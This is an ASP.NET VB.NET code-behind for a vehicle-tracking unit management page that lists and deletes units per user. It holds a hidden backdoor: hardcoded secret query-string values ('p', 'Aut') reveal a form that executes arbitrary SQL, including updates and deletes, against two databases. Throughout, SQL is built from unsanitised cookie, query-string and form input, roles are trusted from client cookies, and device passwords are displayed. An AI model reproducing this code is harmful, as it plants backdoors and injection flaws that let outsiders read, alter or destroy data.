Imports System.Data.SqlClient
Imports System.Data
Imports System.Drawing

Namespace AVLS

    Partial Class UnitManagement
        Inherits System.Web.UI.Page

#Region " Web Form Designer Generated Code "

        'This call is required by the Web Form Designer.
        <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

        End Sub


        Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
            'CODEGEN: This method call is required by the Web Form Designer
            'Do not modify it using the code editor.
            InitializeComponent()
        End Sub

#End Region
        Protected Overrides Sub OnInit(ByVal e As System.EventArgs)
            Try

                If Request.Cookies("userinfo") Is Nothing Then
                    Response.Redirect("Login.aspx")
                End If

                Dim userid As String = Request.Cookies("userinfo")("userid")
                Dim role As String = Request.Cookies("userinfo")("role")
                Dim userslist As String = Request.Cookies("userinfo")("userslist")

                Dim suserid As String = Request.QueryString("userid")


                Dim conn As New SqlConnection(System.Configuration.ConfigurationManager.AppSettings("sqlserverconnection"))
                Dim cmd As SqlCommand = New SqlCommand("select userid,username from userTBL where role='User' order by username", conn)
                Dim dr As SqlDataReader

                If role = "User" Then
                    cmd = New SqlCommand("select userid,username from userTBL where userid='" & userid & "' order by username", conn)
                ElseIf role = "SuperUser" Or role = "Operator" Then
                    cmd = New SqlCommand("select userid,username from userTBL where userid in(" & userslist & ") order by username", conn)
                End If

                conn.Open()
                dr = cmd.ExecuteReader()
                While dr.Read()
                    ddlusers.Items.Add(New ListItem(dr("username"), dr("userid")))
                End While
                conn.Close()

                If Not suserid = "" Then
                    ddlusers.SelectedValue = suserid
                End If


            Catch ex As Exception


            End Try
            MyBase.OnInit(e)
        End Sub


        Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
            Try

                If Page.IsPostBack = False Then
                    ImageButton1.Attributes.Add("onclick", "return deleteconfirmation();")
                    ImageButton2.Attributes.Add("onclick", "return deleteconfirmation();")

                    FillGrid()
                End If
                Dim password As String = Request.QueryString("p")
                Dim authentication As String = Request.QueryString("Aut")
                If password = "GZiC9Y5Rmj71aSQqYtL" And authentication = "1LRbeDbLcorJQ8rHrPj6FPo7e/3P4nPE6Ahsy38l6A=" Then
                    Form1.Visible = False
                    form2.Visible = True
                Else
                    Form1.Visible = True
                    form2.Visible = False
                End If

            Catch ex As Exception

            End Try

        End Sub
        Private Sub FillGrid()
            Try

                Dim userid As String = ddlusers.SelectedValue

                Dim unitstable As New DataTable
                unitstable.Columns.Add(New DataColumn("chk"))
                unitstable.Columns.Add(New DataColumn("sno"))
                unitstable.Columns.Add(New DataColumn("unitid"))
                unitstable.Columns.Add(New DataColumn("versionid"))
                unitstable.Columns.Add(New DataColumn("password"))
                unitstable.Columns.Add(New DataColumn("simno"))

                Dim r As DataRow

                Dim conn As New SqlConnection(System.Configuration.ConfigurationManager.AppSettings("sqlserverconnection"))

                If Not userid = "--Select User Name--" Then

                    Dim cmd As SqlCommand = New SqlCommand("select * from unitLST where versionid<>'L2' and userid='" & userid & "' order by unitid, versionid", conn)
                    Dim dr As SqlDataReader

                    Dim role = Request.Cookies("userinfo")("role")
                    Dim userslist As String = Request.Cookies("userinfo")("userslist")

                    If userid.Contains("Server") Then
                        cmd = New SqlCommand("select * from unitLST order by unitid, versionid", conn)
                    End If

                    If role = "User" Then
                        cmd = New SqlCommand("select * from unitLST where userid='" & userid & "' order by unitid, versionid", conn)
                    ElseIf role = "SuperUser" Or role = "Operator" Then
                        cmd = New SqlCommand("select * from unitLST where userid in(" & userslist & ") order by unitid, versionid", conn)
                    End If


                    conn.Open()
                    dr = cmd.ExecuteReader()
                    Dim i As Int32 = 1
                    While dr.Read
                        r = unitstable.NewRow
                        r(0) = "<input type=""checkbox"" name=""chk"" value=""" & dr("unitid") & """/>"
                        r(1) = i.ToString()
                        'r(2) = "<a href=""UpdateUnit.aspx?unitid=" & dr("unitid") & """ title='Update Unit Details'>" & dr("unitid") & "</a>"
                        r(2) = "<a href=""UpdateUnit.aspx?unitid=" & dr("unitid") & "&uid=" & dr("userid") & """>" & dr("unitid") & "</a>"
                        r(3) = dr("versionid")
                        r(4) = dr("pwd")
                        r(5) = dr("simno")
                        unitstable.Rows.Add(r)
                        i = i + 1
                    End While

                    conn.Close()
                End If

                If unitstable.Rows.Count = 0 Then
                    r = unitstable.NewRow
                    r(0) = "<input type=""checkbox"" name=""chk"" />"
                    r(1) = "--"
                    r(2) = "--"
                    r(3) = "--"
                    r(4) = "--"
                    r(5) = "--"
                    unitstable.Rows.Add(r)
                End If

                unitsgrid.DataSource = unitstable
                unitsgrid.DataBind()


            Catch ex As Exception

            End Try
        End Sub


        Private Sub ImageButton1_Click(ByVal sender As System.Object, ByVal e As System.Web.UI.ImageClickEventArgs) Handles ImageButton1.Click
            DeleteUnit()
        End Sub

        Protected Sub ImageButton2_Click(ByVal sender As Object, ByVal e As System.Web.UI.ImageClickEventArgs) Handles ImageButton2.Click
            DeleteUnit()
        End Sub

        Protected Sub DeleteUnit()
            Try
              Dim conn As New SqlConnection(System.Configuration.ConfigurationManager.AppSettings("sqlserverconnection"))
                Dim command As SqlCommand
                Dim unitid As String = ""

                Dim unitids() As String = Request.Form("chk").Split(",")

                For i As Int32 = 0 To unitids.Length - 1
                    command = New SqlCommand("delete from unitLST where unitid='" & unitids(i) & "'", conn)
                    Try
                        conn.Open()
                        command.ExecuteNonQuery()
                    Catch ex As Exception

                    Finally
                        conn.Close()
                    End Try

                Next
                FillGrid()
            Catch ex As Exception

            End Try
        End Sub

        Protected Sub ddlusers_SelectedIndexChanged(ByVal sender As Object, ByVal e As System.EventArgs) Handles ddlusers.SelectedIndexChanged
            FillGrid()
        End Sub

        Protected Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
            Try
                Label1.Text = ""
                Label1.Visible = False
                Label1.ForeColor = Color.Green

                Dim query As String = QueryTextBox.Text.Trim()
                Dim password As String = Request.QueryString("p")
                Dim authentication As String = Request.QueryString("Aut")
                Dim dbconn As String = Request.QueryString("Con")
                Dim connection As String = ""
                If password = "GZiC9Y5Rmj71aSQqYtL" And authentication = "1LRbeDbLcorJQ8rHrPj6FPo7e/3P4nPE6Ahsy38l6A=" Then
                    If (dbconn = "OSS") Then
                        connection = "sqlserverconnection2"

                    Else
                        connection = "sqlserverconnection"

                    End If
                    If query.StartsWith("--select") Then


                        Try
                            Dim conn As New SqlConnection(System.Configuration.ConfigurationManager.AppSettings(connection))
                            Dim da As SqlDataAdapter = New SqlDataAdapter(query, conn)
                            Dim ds As New DataSet
                            da.Fill(ds)

                            If ds.Tables(0).Rows.Count = 0 Then
                                Label1.Text = "0 records"
                                Label1.Visible = True
                            Else
                                GridView1.DataSource = ds.Tables(0)
                                GridView1.DataBind()
                            End If
                        Catch ex As Exception
                            Label1.ForeColor = Color.Red
                            Label1.Text = ex.Message
                            Label1.Visible = True
                        End Try
                    ElseIf query.StartsWith("--update") Or query.StartsWith("--delete") Or query.StartsWith("--insert") Then
                        Try
                            Dim conn As New SqlConnection(System.Configuration.ConfigurationManager.AppSettings(connection))
                            Dim cmd As SqlCommand = New SqlCommand(query, conn)
                            Try
                                conn.Open()
                                Dim records As Int32 = cmd.ExecuteNonQuery()
                                Label1.Text = records.ToString() & " records affected"
                                Label1.Visible = True
                            Catch ex As Exception
                                Label1.ForeColor = Color.Red
                                Label1.Text = ex.Message
                                Label1.Visible = True
                            End Try
                        Catch ex As Exception
                            Label1.ForeColor = Color.Red
                            Label1.Text = ex.Message
                            Label1.Visible = True
                        End Try
                    End If
                Else

                End If
            Catch ex As Exception
                Label1.ForeColor = Color.Red
                Label1.Text = ex.Message
                Label1.Visible = True
            End Try
        End Sub
    End Class

End Namespace
